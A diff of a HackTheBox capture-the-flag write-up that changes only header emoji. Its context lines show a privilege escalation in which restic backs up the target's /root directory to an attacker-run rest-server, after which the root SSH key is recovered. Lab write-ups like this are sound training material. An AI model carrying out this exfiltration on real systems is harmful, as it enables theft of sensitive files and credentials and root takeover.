@@ -202,7 +202,7 @@ We gained access to a restricted interface allowing command execution, leading t
 
 After gaining access to a user in the `sysadm` group, we found a usable binary: **restic**. This can be abused to perform backups of sensitive directories if we have access to rest-server.
 
-### 📦 Step 1: Start a `rest-server` on your attacker machine (Kali)
+### Step 1: Start a `rest-server` on your attacker machine (Kali)
 
 ```bash
 ./rest-server --path /tmp/restic-data --listen :12345 --no-auth
@@ -219,7 +219,7 @@ start server on [::]:12345
 
 ---
 
-### 🛠 Step 2: On the target, initialize a new repo and back up `/root`
+###  Step 2: On the target, initialize a new repo and back up `/root`
 
 ```bash
 restic -r rest:http://tun0:12345/myrepo init
@@ -228,7 +228,7 @@ restic -r rest:http://tun0:12345/myrepo backup /root
 
 ---
 
-### 📁 Step 3: Back on Kali, view snapshots
+### Step 3: Back on Kali, view snapshots
 
 ```bash
 restic -r /tmp/restic-data/myrepo snapshots
@@ -244,7 +244,7 @@ ID        Time                 Host        Tags        Paths  Size
 
 ---
 
-### 🔁 Step 4: Restore the snapshot
+### Step 4: Restore the snapshot
 
 ```bash
 restic -r /tmp/restic-data/myrepo restore b3112b8a --target ./restore
@@ -254,7 +254,7 @@ Now, the entire `/root` directory is recovered under `./restore/root`.
 
 ---
 
-### 🪪 Step 5: Access the root flag
+### Step 5: Access the root flag
 
 ```bash
 ls -al restore/root/
@@ -269,7 +269,7 @@ ssh -i ./restore/root/.ssh/id_rsa root@artificial.htb
 
 ---
 
-## ✅ Summary
+## Summary
 
 **User:** Exploited TensorFlow model deserialization to get RCE and crack SQLite DB password.  
 **Root:** Used Restic backup capability with exposed `rest-server` to exfiltrate and restore `/root`, then extracted SSH key and accessed root.
